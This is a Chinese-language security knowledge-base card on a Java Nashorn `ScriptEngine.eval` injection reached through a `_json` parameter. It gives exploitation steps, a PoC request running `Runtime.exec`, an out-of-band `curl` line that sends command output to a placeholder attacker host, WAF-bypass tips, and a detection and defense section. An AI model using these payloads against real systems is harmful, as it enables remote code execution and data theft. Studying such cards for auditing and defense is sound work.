---
id: web-java-expression-scriptengine-isjson-eval
title: Java ScriptEngine 的 isJson 校验直接 eval 字符串：_json 参数经 BaseResult 构造器直达 Nashorn 代码执行
type: scenario
domain: web
path: web/java/expression
technique: scriptengine-json-validation-eval-injection
tags:
- java
- scriptengine
- nashorn
- eval
- code-injection
- spring-mvc
- json
- expression-injection
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V33
  verified_at: '2026-11-05T06:00:32+08:00'
  notes: 已对照原文与截图核对：isJson 用 ScriptEngineManager.getEngineByName("js").eval("("+json+")")，BaseResult.create → CodeResult → getCodeByPhoneApp → getRequestJsonString 读 _json 链路与截图一致；原文无 HTTP PoC/执行截图，卡内载荷为按代码构造并已注明，未在本机执行，Nashorn 版本约束已写明
url: /docs/web/java/expression/web-java-expression-scriptengine-isjson-eval/
draft: false
kb_aliases:
- isJson ScriptEngine eval
- ScriptEngineManager js eval 注入
- BaseResult create isJson
- _json 参数代码注入
- Nashorn eval 注入
- Java JSON 校验执行代码
---

## 一句话结论

工具类 `CMSTools.isJson(String json)` 用 `new ScriptEngineManager().getEngineByName("js").eval("(" + json + ")")` 来“判断 JSON 是否合法”；`BaseResult` 的构造器 `create(json)` 会调用它，而 `CodeResult` 等子类把 HTTP 参数 `_json` 原样传入；攻击者在 `_json` 中闭合外层括号并写入 JavaScript，即可在 Nashorn 引擎中执行任意代码（含调用 Java 类）。

## 原理

- `isJson` 的实现不是 `JSON.parse`，而是把输入拼成 `"(" + json + ")"` 交给 `ScriptEngine.eval`。它的本意是“让 JS 引擎解析对象字面量，抛异常即不是 JSON”，但 `eval` 会执行代码，而不仅是解析。
- 攻击者输入可以提前闭合外层括号：`_json=1);java.lang.Runtime.getRuntime().exec('id');(1` 会变成 `(1);java.lang.Runtime.getRuntime().exec('id');(1)`，依次执行。
- 调用链：Spring MVC 控制器 `getCodeByPhoneApp` → `new CodeResult(this.getRequestJsonString(request), this.appService, 0)` → `CodeResult(String json, ...)` 构造器 `super(json, type)` → `BaseResult.create(json)` → `CMSTools.isJson(json)` → `ScriptEngine.eval`。
- `getRequestJsonString(request)` 先读 `request.getParameter("_json")`，非空直接返回；否则按 GET/POST 取 query/body 并 URLDecode。因此 `_json` 是攻击者完全可控的 GET/POST 参数。
- `BaseResult` 有多个子类（如 `CodeResult`、`UserAvatarResult`），共享同一构造器逻辑；任何把用户输入传给子类构造器的端点都可能进入同一 eval。
- 运行环境决定可利用性：JDK 8–14 自带 Nashorn（`getEngineByName("js")` 可用），Nashorn 可通过 `Java.type(...)`/`java.lang.*` 访问 Java 类并执行命令；JDK 15+ 移除 Nashorn，若未引入独立引擎则 `getEngineByName("js")` 返回 null，链退化。
- 即使不调用 Java，纯 JS 也可造成拒绝服务/信息泄露；调用 Java 类则等价于应用进程权限的任意代码执行。

## 触发条件

- 目标使用该 `isJson` 实现，且 JDK 含 Nashorn（8–14）或额外安装了 JS 引擎。
- 可达的端点把 `_json`（或其它经 `getRequestJsonString` 读取的参数）传入 `BaseResult` 子类构造器；原文端点为 `getCodeByPhoneApp`。
- 应用未对 `_json` 做 JSON 结构校验/字符过滤，或过滤可被括号闭合绕过。
- 端点可能无需认证（App 前台接口）；若需认证，低权限账号即可。

## 利用步骤

1. 找到调用 `new XxxResult(getRequestJsonString(request), ...)` 的控制器端点（如 `/app/getCodeByPhoneApp.do`）。
2. 构造 `_json` 载荷，闭合 `eval("(" + json + ")")` 的外层括号并执行 JS。
3. 先执行 `java.lang.Runtime.getRuntime().exec('id')` 或写文件验证；无回显时用 DNS/HTTP 带外或写 Web 目录。
4. 反弹 shell 或读取敏感文件。
5. 若 `_json` 被 WAF 拦 `java.lang`，可用 Nashorn 的 `Java.type('java.lang.Runtime')`、字符串拼接/Unicode 转义等方式变形。

## PoC

原文未给出可直接执行的 HTTP PoC，以下按代码路径构造最小载荷：

```http
POST /app/getCodeByPhoneApp.do HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

_json=1);java.lang.Runtime.getRuntime().exec('id');(1
```

服务端 eval 的字符串变为：

```javascript
(1);java.lang.Runtime.getRuntime().exec('id');(1)
```

带外验证（无回显）：

```text
_json=1);java.lang.Runtime.getRuntime().exec('curl http://attacker/`id`');(1
```

（实际需 URL 编码空格/引号；`exec` 参数为数组时更稳，如 `exec(['bash','-c','...'])`。）

## 变体与关联

- 其他子类：`UserAvatarResult` 等继承 `BaseResult` 的类同样在构造器里 `create(json)`；任何把 `_json` 传入这些构造器的端点都可尝试。
- `getRequestJsonString` 也支持 GET query 与 POST body，注入点不限于 `_json` 参数名。
- 若 `eval` 外层不是 `"(" + json + ")"` 而是直接 `eval(json)`，载荷更简单；本卡按原文的括号包裹构造。
- 与 [[web-java-expression-spel]] 层的表达式注入同属“用户输入进入解释器”，区别是引擎为 Nashorn 而非 SpEL/OGNL。
- 与 [[web-java-rce-spring-actionnetworkcmd-ip-time-sh-c]] 可组合：同一应用可能同时存在命令注入与 eval 注入。

## 检测与防御

- 禁止用 `ScriptEngine.eval` 做 JSON 校验；改用 Jackson `ObjectMapper.readTree`、`JSONObject.fromObject`、`JSON.parse` 等纯解析器，解析失败即拒绝。
- 移除不必要的脚本引擎依赖；JDK 升级到 15+ 并确认 `getEngineByName("js")` 不可用（但不要作为唯一防御）。
- 对 `_json` 等参数做结构/长度/字符白名单校验；不要用字符串拼接构造可执行代码。
- 代码审计：搜索 `ScriptEngineManager`、`getEngineByName`、`eval(`、`isJson`，确认输入来源；搜索 `BaseResult`/`getRequestJsonString` 的调用点。
- 检测：请求参数含 `);`、`Java.type`、`java.lang.Runtime`、`getRuntime`、`exec(`、反引号等；应用进程异常派生子进程；Nashorn 相关类加载/脚本执行日志。
